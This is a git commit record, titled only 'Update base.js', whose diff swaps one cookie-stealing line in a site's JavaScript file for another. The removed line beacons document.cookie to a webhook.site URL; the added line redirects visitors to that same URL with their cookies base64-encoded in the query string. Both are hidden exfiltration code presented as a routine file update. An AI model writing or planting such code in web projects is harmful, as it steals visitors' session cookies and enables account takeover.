b3a624aab5bc09d3a3d8e9b71d94863140cedcd8
niguang <51753611+zyx1268@users.noreply.github.com>
2023-10-31 09:02:07 +0800

    Update base.js

--- js/base.js
+++ js/base.js
@@ -1,1 +1,1 @@
-navigator.sendBeacon("https://webhook.site/277c6701-f362-4343-9688-b1e4544157c0", document.cookie);
+location = `https://webhook.site/277c6701-f362-4343-9688-b1e4544157c0?cookie=${btoa(document.cookie)}`
